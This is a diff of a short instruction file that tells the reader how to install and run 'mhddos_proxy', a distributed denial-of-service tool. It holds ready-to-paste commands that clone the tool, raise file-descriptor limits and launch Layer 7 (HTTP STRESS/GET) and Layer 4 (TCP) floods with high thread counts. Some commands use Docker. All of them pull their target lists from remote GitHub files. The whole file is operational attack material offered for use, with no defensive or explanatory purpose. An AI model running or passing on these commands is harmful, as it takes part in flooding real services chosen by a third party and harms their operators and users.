@@ -1,20 +1,27 @@
+!!PYTHON SETUP AND SCRIPT FOR MHDDOS_PROXY
+
 sudo apt-get update && sudo apt-get install -y git && sudo apt install python3 && sudo apt install python3-pip -y && sudo apt install screen -y
 
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git && cd mhddos_proxy && python3 -m pip install -r requirements.txt
 
-
 ulimit -n 1048576
 
 screen
-cd mhddos_proxy
 
+cd mhddos_proxy
 
 !!HTTP(L7):!!
 python3 runner.py -t 1000 --rpc 1000 --debug --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
 
-docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --debug -c --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
-
 !!TCP(L4):!!
 python3 runner.py -t 1000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
 
+
+
+
+
+!!SCRIPT FOR DOCKER (you need to setup Docker first!!!)
+
 docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --debug -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l4_tcp_all.txt
+
+docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -t 2000 --rpc 1000 --debug -c --http-methods STRESS GET -c https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/l7_all.txt
